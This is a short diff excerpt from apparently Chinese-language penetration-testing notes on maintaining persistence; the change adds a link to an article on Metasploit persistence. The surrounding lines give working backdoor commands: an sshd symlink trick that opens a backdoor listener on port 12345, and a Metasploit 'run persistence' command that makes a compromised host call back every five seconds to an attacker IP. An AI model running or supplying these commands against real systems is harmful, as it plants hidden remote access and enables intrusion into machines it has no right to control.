@@ -216,6 +216,7 @@ ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345
 msf 维持 1 run persistence
 
 ```bash
+# [浅谈msf在渗透测试中的持久化](https://mp.weixin.qq.com/s/kiZfjMSLHF44UjpdGFvFVw)
 run persistence –h #查看帮助
 run persistence -U -i 5 -p 1234 -r 192.168.47.128
 #-U指定启动的方式为用户登录时，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
